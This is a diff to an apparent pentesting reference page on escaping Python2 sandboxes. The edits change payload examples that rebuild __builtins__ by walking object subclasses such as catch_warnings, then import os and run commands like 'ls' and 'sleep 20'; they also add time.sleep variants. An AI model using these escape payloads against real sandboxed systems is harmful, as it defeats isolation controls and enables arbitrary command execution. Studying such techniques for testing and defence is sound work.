@@ -185,9 +185,10 @@ __builtin__.__dict__['__import__']("os").system("ls")
 {% tabs %}
 {% tab title="Python2" %}
 ```python
-# 1.
+# 1 : recover __builtins__ in make eveything easier
 __builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
 __builtins__['__import__']('os').system('sleep 20')
+__builtins__['__import__']('time').sleep(20)
 
 
 # 2 : 
@@ -199,14 +200,11 @@ i=()
 ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")
 
 
-# Or you could recover __builtins__ in make eveything easier
-__builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
-__builtins__["__import__"]('os').system('ls')
-
 
 # 4 : Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
 #().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
 i=().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os')\ni.system('sleep 20')
+i=().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('time')\ni.sleep(20)
 
 
 # 5
